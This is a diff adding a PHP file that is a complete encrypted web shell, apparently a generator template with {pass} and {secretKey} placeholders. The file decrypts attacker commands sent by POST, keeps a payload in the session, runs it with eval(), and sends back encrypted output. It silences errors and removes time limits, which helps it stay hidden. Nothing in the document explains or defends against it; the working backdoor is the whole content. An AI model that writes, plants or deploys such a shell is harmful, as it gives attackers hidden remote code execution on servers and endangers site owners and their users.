@@ -1,0 +1,70 @@
+<?php
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function encryption($data, $mode,$key) {
+    $result = false;
+    $iv = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+    $blocksize = 16;
+    $size = strlen($data)%16;
+    if (function_exists("openssl_encrypt") && $mode<2) {
+        if ($mode == 1) {
+            $pad = $blocksize - (strlen($data) % $blocksize);
+            $data.= str_repeat(chr($pad), $pad);
+            $result = @openssl_encrypt($data, "AES-128-ECB", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING,$iv);
+        } else if (!$size){
+            $result = @openssl_decrypt($data, "AES-128-ECB", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING,$iv);
+        }
+    } else if (function_exists("mcrypt_encrypt")&&$mode<2) {
+        if ($mode == 1) {
+            $pad = $blocksize - (strlen($data) % $blocksize);
+            $data.= str_repeat(chr($pad), $pad);
+            $result = @mcrypt_encrypt("rijndael-128", $key, $data, "ecb", $iv);
+        } else if (!$size){
+            $result = @mcrypt_decrypt("rijndael-128", $key, $data, "ecb", $iv);
+        }
+    }
+    if (!$result)
+    {
+        $len = strlen($data);
+        $keyLen = strlen($key);
+        $index = 0;
+        for ($i = 1; $i <= $len; $i++) {
+            $index = $i - 1;
+            $data[$index] = $data[$index] ^ $key[($i % $keyLen)];
+        }
+        return $data;
+    }
+    if ($mode == 0) {
+        $pad = ord($result {
+        strlen($result) - 1
+        });
+        if ($pad > strlen($result)) return false;
+        if (strspn($result, chr($pad), strlen($result) - $pad) != $pad) return false;
+        $result = substr($result, 0, -1 * $pad);
+    }
+    return $result;
+}
+
+$pass = '{pass}';
+$payloadName = 'payload';
+$key = '{secretKey}';
+if (isset($_POST[$pass])) {
+    $data = base64_decode($_POST[$pass]);
+    if (isset($_SESSION[$payloadName])) {
+        $payload = encryption($_SESSION[$payloadName],0, $key);
+        if (strpos($payload, "getBasicsInfo") === false) {
+            $payload = encryption($_SESSION[$payloadName],0, $key);
+        }
+        $data = encryption($data,0, $key);
+        eval($payload);
+        echo substr(md5($pass.$key), 0, 16);
+        echo base64_encode(encryption(@run($data),1,$key));
+        echo substr(md5($pass.$key), 16);
+    } else {
+        $data = encryption($data,2,$key);
+        if (strpos($data, "getBasicsInfo") !== false) {
+            $_SESSION[$payloadName] = encryption($data,1, $key);
+        }
+    }
+}
